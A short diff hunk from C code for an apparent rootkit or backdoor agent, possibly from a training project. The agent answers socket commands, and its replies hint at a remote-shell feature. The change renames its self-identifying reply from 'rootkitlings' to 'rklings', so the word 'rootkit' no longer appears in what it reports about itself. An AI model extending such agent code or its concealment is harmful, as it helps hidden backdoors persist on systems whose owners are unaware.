@@ -56,7 +56,7 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 			    const struct rk_frame *frame, bool *close_session)
 {
 	static const unsigned char error_reply[] = "ERR";
-	static const unsigned char info_reply[] = "INFO rootkitlings";
+	static const unsigned char info_reply[] = "INFO rklings";
 	static const unsigned char pong_reply[] = "PONG";
 	static const unsigned char busy_reply[] = "ERR busy";
 	static const unsigned char shell_error_reply[] = "ERR shell";
